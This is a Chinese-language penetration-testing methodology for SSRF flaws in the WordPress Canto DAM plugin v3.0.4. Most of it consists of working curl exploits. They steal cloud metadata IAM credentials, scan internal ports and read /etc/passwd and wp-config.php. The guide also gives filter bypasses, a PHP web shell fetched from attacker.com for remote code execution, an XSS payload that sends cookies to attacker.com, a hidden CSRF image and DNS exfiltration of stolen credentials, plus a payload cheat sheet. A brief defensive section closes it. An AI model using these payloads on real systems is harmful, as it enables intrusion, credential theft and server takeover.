# WordPress Canto 插件 SSRF 攻击方法论

## 1. 技术介绍

### 1.1 漏洞原理

WordPress Canto DAM 插件 v3.0.4 的 6 个 PHP 库文件存在严重的 SSRF（服务器端请求伪造）漏洞。这些文件接受用户可控的 URL 组件参数（`subdomain`、`app_api`），直接将其拼接到 HTTPS URL 中，没有任何域名白名单验证或 URL 校验机制。

**漏洞本质：** 应用层代码将用户输入作为外部 API 请求的目标地址，违背了"不信任用户输入"的安全原则。

### 1.2 受影响组件

| 文件路径 | 漏洞参数 | HTTP 方法 | 认证要求 |
|---------|---------|---------|---------|
| `/wp-content/plugins/canto/includes/lib/get.php` | `subdomain`, `app_api`, `album`, `keyword` | GET/POST | 需要 WordPress 登录 |
| `/wp-content/plugins/canto/includes/lib/download.php` | `subdomain`, `app_api`, `id` | GET/POST | 需要 WordPress 登录 |
| `/wp-content/plugins/canto/includes/lib/detail.php` | `subdomain`, `app_api`, `scheme`, `id` | GET/POST | 需要 WordPress 登录 |
| `/wp-content/plugins/canto/includes/lib/tree.php` | `subdomain`, `app_api`, `ablumid` | GET/POST | 需要 WordPress 登录 |
| `/wp-content/plugins/canto/includes/lib/copy-media.php` | `fbc_flight_domain`, `fbc_app_api` | POST | 需要 WordPress 登录 |

### 1.3 漏洞代码模式

```php
// 漏洞代码示例 (get.php 第 8-43 行)
$subdomain = sanitize_text_field($_REQUEST['subdomain']);
$app_api = sanitize_text_field($_REQUEST['app_api']);

// 危险：直接拼接用户输入到 URL
$url = 'https://' . $subdomain . '.' . $app_api . '/api/v1/search?keyword=' . urlencode($keyword);

// 使用 WordPress HTTP API 发起请求
$response = wp_remote_get($url, array('timeout' => 120));
```

---

## 2. 攻击常见于哪些业务场景

### 2.1 第三方集成插件

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **DAM 数字资产管理** | Canto 插件集成外部媒体库 | 插件接受用户可控的 API 端点参数，无域名验证 |
| **云存储同步** | S3/Google Drive 同步插件 | 存储端点参数可控，可指向内网服务 |
| **OAuth 认证集成** | 第三方登录插件 | OAuth 回调 URL 可被操纵指向内网 |
| **Webhook 通知** | 事件通知插件 | Webhook 目标 URL 无验证 |
| **API 代理转发** | REST API 代理插件 | 代理目标地址用户可控 |

### 2.2 WordPress 插件特有风险

Canto 插件的架构设计存在根本性缺陷：
- 6 个 PHP 库文件直接通过 HTTP 访问，绕过 WordPress 路由系统
- 使用 `require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php')` 引导 WordPress
- 完全信任用户提供的 API 端点参数

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

抓取所有与 Canto 插件交互的请求，重点关注以下参数：

```http
GET /wp-content/plugins/canto/includes/lib/get.php?subdomain=test&app_api=example.com&album=123&token=abc HTTP/1.1
Host: target-wordpress.com
Cookie: wordpress_logged_in_...=...
```

**可疑参数特征：**
- 参数值看起来像域名或 IP 地址（`subdomain`, `domain`, `host`, `api_url`）
- 参数参与 URL 构造（`app_api`, `endpoint`, `base_url`）
- 参数名为媒体 ID 但实际用于 API 请求（`album`, `fbc_id`）

#### 3.1.2 初步探测

使用 DNSLog 服务检测 SSRF：

```bash
# 获取 DNSLog 子域名
DNSLOG_SUBDOMAIN=$(curl http://dnslog.cn/getdomain.php)

# 发送 SSRF 探测请求
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=${DNSLOG_SUBDOMAIN}&app_api=.dnslog.cn&token=test"

# 检查 DNSLog 平台是否收到请求
curl http://dnslog.cn/records.php
```

#### 3.1.3 结果验证

**成功标志：**
- DNSLog 平台收到 DNS 查询请求
- 响应时间明显延长（请求内网服务超时）
- 返回错误信息包含目标服务特征（如 `Connection refused` 指向特定端口）

### 3.2 白盒测试

#### 3.2.1 代码审计

搜索以下危险模式：

```bash
# 搜索 URL 拼接模式
grep -rn "https://.*\$_REQUEST\[" wp-content/plugins/canto/
grep -rn "wp_remote_get.*\$_" wp-content/plugins/canto/

# 搜索 sanitize_text_field 后直接用于 URL
grep -A5 "sanitize_text_field.*subdomain\|sanitize_text_field.*app_api" wp-content/plugins/canto/
```

#### 3.2.2 数据流追踪

追踪用户输入到 HTTP 请求的完整路径：

```
$_REQUEST['subdomain'] 
  → sanitize_text_field() (仅移除 HTML 标签，不验证 URL)
  → 字符串拼接到 $url 变量
  → wp_remote_get($url) (WordPress HTTP API)
  → curl_exec() (底层 cURL 实现)
  → 发起外部 HTTP 请求
```

---

## 4. 漏洞利用方法

### 4.1 基础信息收集

#### 4.1.1 云元数据服务访问

**AWS EC2 元数据：**

```bash
# 获取实例元数据
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=.254/latest/meta-data&token=test"

# 获取 IAM 角色名称
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=.254/latest/meta-data/iam/security-credentials/&token=test"

# 获取 IAM 凭证
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=169.254.169&app_api=.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]&token=test"
```

**GCP 元数据服务：**

```bash
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/detail.php?wp_abspath=/var/www/html&subdomain=metadata.google&app_api=internal&scheme=computeMetadata&id=v1/instance/service-accounts/default/token"
```

#### 4.1.2 内网端口扫描

```bash
# 扫描常见内网端口
for port in 22 80 443 3306 6379 5432 8080 9200; do
  response=$(curl -s -b "wordpress_logged_in_...=..." \
    "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:${port}&id=test")
  
  if [[ "$response" != *"Connection refused"* ]]; then
    echo "Port $port: OPEN or FILTERED"
  else
    echo "Port $port: CLOSED"
  fi
done
```

#### 4.1.3 内部服务识别

```bash
# 访问内网 HTTP 服务
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=192.168.1&app_api=100:8080&token=test"

# 访问 Redis 服务（返回 Redis 横幅）
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=/var/www/html&subdomain=127.0.0.1&app_api=:6379&id=INFO"
```

### 4.2 文件操作

#### 4.2.1 读取本地文件（file:// 协议）

```bash
# 读取 /etc/passwd
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=file://&app_api=/etc/passwd%00&token=test"

# 读取 WordPress 配置文件
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=file://&app_api=/var/www/html/wp-config.php%00&token=test"
```

#### 4.2.2 多阶段 SSRF 链（copy-media.php）

```bash
# 第一阶段：指向攻击者控制的服务器
curl -X POST -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/copy-media.php" \
  -d "abspath=/var/www/html&fbc_flight_domain=attacker&fbc_app_api=.com&fbc_scheme=api&fbc_id=v1&fbc_app_token=test&post_id=1"

# 攻击者服务器返回恶意 JSON，包含内网 URL
# {
#   "url": {
#     "download": "http://169.254.169.254/latest/meta-data/iam/security-credentials/default"
#   }
# }

# 第二阶段：WordPress 服务器请求内网地址并下载文件
# 第三阶段：文件被写入 /tmp/ 并通过 media_handle_sideload() 上传到媒体库
```

### 4.3 建立反向 Shell（结合 LFI）

```bash
# 1. 通过 SSRF 读取 wp-config.php 获取数据库凭证
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=file://&app_api=/var/www/html/wp-config.php%00&token=test"

# 2. 利用 LFI 漏洞执行 PHP 代码（需要 allow_url_include=On）
curl -b "wordpress_logged_in_...=..." \
  "http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.txt?&subdomain=test&app_api=evil.com&token=test"

# 3. 攻击者服务器上的 shell.txt 内容：
# <?php system($_GET['cmd']); ?>
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过域名过滤

#### 5.1.1 IP 地址编码绕过

```bash
# 十进制 IP 绕过
169.254.169.254 → 2852039166
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=2852039166&app_api=&token=test"

# 八进制 IP 绕过
169.254.169.254 → 0251.0376.0251.0376
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=0251.0376.0251.0376&app_api=&token=test"

# 十六进制 IP 绕过
169.254.169.254 → 0xA9.0xFE.0xA9.0xFE
curl "http://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=0xA9.0xFE.0xA9.0xFE&app_api=&token=test"
```

#### 5.1.2 DNS 重绑定攻击

```bash
# 使用 DNS 重绑定服务
curl -b "wordpress_logged_in_...=..." \
  "http://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=rbndr.us&app_api=.&token=test"

# rbndr.us 解析为公网 IP → 通过验证 → 重解析为 127.0.0.1
```

### 5.2 绕过协议限制

#### 5.2.1 协议头注入

```bash
# 在 subdomain 参数中注入 file:// 协议
subdomain=file://&app_api=/etc/passwd%00

# 在 app_api 参数中注入协议
subdomain=169.254.169&app_api=.254:file:///etc/passwd
```

#### 5.2.2 URL 解析差异利用

```bash
# 利用不同 URL 解析库的差异
# Python requests 库：https://evil.com@127.0.0.1/ 访问 127.0.0.1
# PHP filter_var：可能认为这是合法 URL

curl "http://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=evil.com@127.0.0.1&app_api=:8080&token=test"
```

### 5.3 绕过认证要求

#### 5.3.1 会话 Cookie 窃取

如果应用存在 XSS 漏洞：

```javascript
// XSS Payload 窃取 WordPress 会话 Cookie
fetch('https://attacker.com/steal?cookie=' + btoa(document.cookie));
```

#### 5.3.2 CSRF 攻击

由于 Canto 插件端点缺少 nonce 验证：

```html
<!-- 攻击者网站上的 CSRF 页面 -->
<img src="http://target-wordpress.com/wp-content/plugins/canto/includes/lib/get.php?subdomain=169.254.169&app_api=.254/latest/meta-data&token=x" 
     style="display:none" />
```

### 5.4 无回显 SSRF 利用

#### 5.4.1 时间延迟检测

```bash
# 使用 sleep 参数检测盲注 SSRF
curl -b "wordpress_logged_in_...=..." \
  "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=10.0.0&app_api=.1:80/sleep(5)&token=test"

# 如果响应时间 > 5 秒，说明端口开放
```

#### 5.4.2 DNSLog 外带数据

```bash
# 将元数据通过 DNS 查询外带
METADATA=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/default")
curl "http://${METADATA}.attacker.com/exfil"
```

---

## 6. 渗透测试决策流程

```
开始 SSRF 测试
    │
    ▼
识别 SSRF 端点
    │
    ├── 参数名为 subdomain/domain/host/api_url
    ├── 参数参与 URL 构造
    └── 应用发起外部 HTTP 请求
    │
    ▼
验证 SSRF 存在性
    │
    ├── 使用 DNSLog 检测
    ├── 检测响应时间差异
    └── 分析错误消息
    │
    ▼
确定 SSRF 类型
    │
    ├── 回显型 SSRF → 直接获取响应内容
    │   ├── 云元数据访问
    │   ├── 内网服务探测
    │   └── 端口扫描
    │
    └── 盲注型 SSRF → 使用时间/DNS 检测
        ├── 时间延迟检测
        ├── DNSLog 外带
        └── 错误消息分析
    │
    ▼
深度利用
    │
    ├── 结合 file:// 协议读取文件
    ├── 结合 LFI 实现 RCE
    ├── 多阶段 SSRF 链
    └── 内网横向移动
```

---

## 7. 常用 Payload 速查表

| 类别 | 目标/环境 | Payload 示例 | 说明 |
|-----|---------|------------|------|
| **云元数据** | AWS EC2 | `subdomain=169.254.169&app_api=.254/latest/meta-data` | 访问 AWS 元数据服务 |
| **云元数据** | AWS IAM | `subdomain=169.254.169&app_api=.254/latest/meta-data/iam/security-credentials/` | 获取 IAM 角色凭证 |
| **云元数据** | GCP | `subdomain=metadata.google&app_api=internal&scheme=computeMetadata&id=v1/instance` | 访问 GCP 元数据 |
| **内网扫描** | 本地回环 | `subdomain=127.0.0.1&app_api=:8080` | 扫描本地端口 |
| **内网扫描** | RFC1918 | `subdomain=192.168.1&app_api=.1:3306` | 访问内网 MySQL |
| **文件读取** | Linux | `subdomain=file://&app_api=/etc/passwd%00` | 读取 /etc/passwd |
| **文件读取** | WordPress | `subdomain=file://&app_api=/var/www/html/wp-config.php%00` | 读取数据库凭证 |
| **协议绕过** | 十进制 IP | `subdomain=2852039166&app_api=` | 169.254.169.254 的十进制表示 |
| **协议绕过** | DNS 重绑定 | `subdomain=rbndr.us&app_api=.` | 使用 DNS 重绑定服务 |

---

## 8. 与 WordPress 特定场景的结合

### 8.1 结合 XSS 攻击链

```
1. 发现 Canto 插件 XSS 漏洞（attachment.js 第 34-37 行）
2. 通过 SSRF 注入恶意 JSON 到 Canto 媒体库
3. 管理员访问媒体库时 XSS 执行
4. 窃取管理员会话 Cookie
5. 使用窃取的 Cookie 进行 SSRF 攻击
```

### 8.2 结合 LFI 实现 RCE

```
1. 通过 SSRF 读取 wp-config.php 获取数据库凭证
2. 利用 get.php 的 wp_abspath 参数进行 LFI
3. 设置 wp_abspath=http://attacker.com/shell.txt?
4. 需要 allow_url_include=On 配置
5. 执行任意 PHP 代码
```

### 8.3 结合 OAuth CSRF

```
1. 利用 Canto 插件 OAuth CSRF 漏洞（缺少 state 验证）
2. 将管理员 WordPress 链接到攻击者控制的 Canto 账户
3. 通过 SSRF 监控所有媒体导入操作
4. 注入恶意媒体文件到 WordPress
```

---

## 9. 防御建议

### 9.1 代码层修复

```php
// 实现域名白名单验证
$allowed_domains = ['canto.com', 'canto.global', 'canto.de'];

$parsed_url = parse_url($url);
$host = $parsed_url['host'];

$domain_valid = false;
foreach ($allowed_domains as $allowed) {
    if ($host === $allowed || str_ends_with($host, '.' . $allowed)) {
        $domain_valid = true;
        break;
    }
}

if (!$domain_valid) {
    wp_die('Invalid Canto domain');
}
```

### 9.2 网络层防护

- 配置出站防火墙规则，限制 WordPress 服务器只能访问特定域名
- 阻止对 169.254.169.254 等元数据服务的访问
- 实施 egress 过滤，监控异常出站连接

---

**文档版本：** 1.0  
**最后更新：** 2025-10-29  
**适用目标：** WordPress Canto DAM 插件 v3.0.4  
**关联漏洞：** SSRF-VULN-01 至 SSRF-VULN-06
